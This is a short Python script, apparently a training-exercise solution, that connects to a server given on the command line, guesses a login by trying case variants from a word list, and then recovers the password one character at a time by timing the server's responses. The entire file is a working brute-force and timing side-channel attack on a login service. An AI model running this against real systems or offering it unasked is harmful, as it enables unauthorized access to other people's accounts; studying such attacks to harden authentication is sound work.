import json
import itertools
import sys
import socket
import string
from datetime import datetime

log_pass = {
    "login": "admin",
    "password": " "
}

with open('logins.txt', 'r') as logins_file:
    logins = [x.strip('\n') for x in logins_file]
log_pass_dumps = json.dumps(log_pass)
log_pass_loads = json.loads(log_pass_dumps)


def connecting_to_server():
    correct_login, correct_password = '', ''
    connection = socket.socket()
    argv = sys.argv
    host, port = argv[1], int(argv[2])
    connection.connect((host, port))
    for i in brut_force_login(logins):
        log_pass_loads['login'] = i
        connection.send(json.dumps(log_pass_loads).encode())
        answer = json.loads(connection.recv(1024))
        if answer['result'] == 'Wrong password!':
            correct_login = log_pass_loads['login']
            break
    for k in range(1_000_000):
        for i in brut_force_password():
            log_pass_loads['password'] = correct_password + i
            start = datetime.now()
            connection.send(json.dumps(log_pass_loads).encode())

            answer = json.loads(connection.recv(1024))
            finish = datetime.now()
            difference = finish - start
            if difference.microseconds >= 2000 and answer['result'] == 'Wrong password!':
                correct_password = correct_password + i
            elif answer['result'] == 'Connection success!':
                log_pass['login'], log_pass['password'] = correct_login, correct_password + i
                print(json.dumps(log_pass))
                exit()

    connection.close()


def brut_force_login(typical_login):
    for login in typical_login:
        all_logins = map(''.join, itertools.product(*((c.upper(), c.lower()) for c in login)))
        for x in all_logins:
            yield x


def brut_force_password():
    alphabet = string.digits + string.ascii_letters
    all_logins = itertools.product(alphabet)
    for x in all_logins:
        yield x[0]


connecting_to_server()
